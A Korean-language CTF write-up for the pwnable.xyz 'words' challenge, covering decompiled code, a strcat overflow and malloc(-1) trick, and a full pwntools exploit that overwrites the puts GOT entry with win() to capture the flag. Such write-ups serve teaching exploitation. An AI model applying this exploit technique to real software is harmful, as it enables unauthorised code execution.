# [pwnable.xyz] words

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Fill in the missing...
>
> Release: [words.zip](https://github.com/h0meb0dy/pwnable.xyz/files/9109557/words.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/178926999-e9e7692d-1258-4eaa-b029-e3643d262540.png)

## Analysis

```c
int fill_handles()
{
  int sentence; // [rsp+8h] [rbp-8h]
  int answer; // [rsp+Ch] [rbp-4h]

  printf(
    "Choose: \n"
    "1. ___ says I suck at math :(.\n"
    "2. The strongest crossfitter in OTA is ___.\n"
    "3. ___ is a neural-network machine-learning AI.\n"
    "4. ___ says \"F*ck Me Dead Mate!!\" when surprised.\n"
    "5. ___ is a cheap imitation of corb0tnik.\n"
    "> ");
  sentence = read_int32();
  printf("Choose: \n1. vakzz\n2. kileak\n3. grazfather\n4. corb3nik\n5. rh0gue\n> ");
  answer = read_int32();
  if ( sentence == 2 )
  {
    strcpy(a, "The strongest crossfitter in OTA is ");
  }
  else
  {
    switch ( answer )
    {
      case 1:
        strcpy(a, "vakzz");
        break;
      case 2:
        strcpy(a, "kileak");
        goto LABEL_6;
      case 3:
LABEL_6:
        strcpy(a, "grazfather");
        break;
      case 4:
        strcpy(a, "corb3nik");
        break;
      case 5:
        strcpy(a, "rh0gue");
        break;
      default:
        break;
    }
  }
  switch ( sentence )
  {
    case 1:
      strcat(a, " says I suck at math :(.");
      break;
    case 2:
      switch ( answer )
      {
        case 1:
          strcat(a, "vakzz");
          break;
        case 2:
          strcat(a, "kileak");
          break;
        case 3:
          strcat(a, "grazfather");
          break;
        case 4:
          strcat(a, "corb3nik");
          break;
        case 5:
          strcat(a, "rh0gue");
          break;
        default:
          return puts(a);
      }
      break;
    case 3:
      strcat(a, " is a neural-network machine-learning AI.");
      break;
    case 4:
      strcat(a, " says \"F*ck Me Dead Mate!!\" when surprised.");
      break;
    case 5:
      strcat(a, " is a cheap imitation of corb0tnik.");
      break;
    default:
      return puts(a);
  }
  return puts(a);
}
```

`sentence`가 `2`가 아니고 `answer`이 `1`~`5`가 아니면 `strcpy()`가 호출되지 않고 `strcat()`만 호출된다. 따라서 문자열을 무한히 길게 이어붙일 수 있어서, `a`의 바로 뒤에 있는 `buf`를 덮어쓸 수 있다.

## Exploit

```c
ssize_t save_progress()
{
  signed int size; // [rsp+4h] [rbp-Ch]

  if ( buf )
    return read(0, buf, 0x1000uLL);
  printf("Size: ");
  size = read_int32();
  if ( (unsigned int)size <= 0xFFF )
  {
    puts("Invalid.");
    exit(1);
  }
  if ( malloc(size) )
    return read(0, buf, size);
  buf = &reserve;
  return read(0, &reserve, 0x1000uLL);
}
```

`save_progress()`에서 `size`에 `-1`을 입력하면 `malloc(size)`가 정상적으로 실행되지 않아서 0을 반환하고, 따라서 `buf`에는 `reserve`의 주소(`0x610ec0`)가 들어간다.

![image](https://user-images.githubusercontent.com/104156058/178969515-713bf6bc-c0f7-426a-95c7-e93508712171.png)

`fill_handles()`로 이어붙인 문자열의 길이가 정확히 256바이트가 되도록 하면, `strcat()`이 마지막에 `'\x00'`을 붙여서 `buf`에 `a+96`(`0x610e00`)이 들어간다.

![image](https://user-images.githubusercontent.com/104156058/179868634-7924a026-a1b1-48b0-b163-b4f32dc0bbb7.png)

이 상태에서 `save_progress()`를 호출하면 `0x610e00`부터 `0x1000`바이트만큼 입력할 수 있다. `buf`를 `puts()`의 GOT 주소로 덮고, 다시 `save_progress()`를 호출하여 `puts()`의 GOT를 `win()`의 주소로 덮으면 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30036)

sla = r.sendlineafter

def fill_handles(sentence, answer):
    sla('> ', '3')
    sla('> ', str(sentence))
    sla('> ', str(answer))

def save_progress(data=None):
    sla('> ', '5')
    if data:
        r.sendline(data)

puts_got = 0x610b10
win = 0x4008e8

save_progress()
sla('Size: ', '-1') 
r.send('\x00') # address of reserve (0x610ec0) in buf

for i in range(5):
    fill_handles(4, 0)
fill_handles(3, 0) # overwrite last 1byte of buf with '\x00' (0x610e00)

save_progress(b'A' * 0xa0 + p64(puts_got)) # overwrite buf with puts@GOT
save_progress(p64(win)) # puts@GOT -> win()

sla('> ', '6') # call puts() -> win()

r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30036: Done
[*] Switching to interactive mode
FLAG{words_are_made_of_sentences}
```
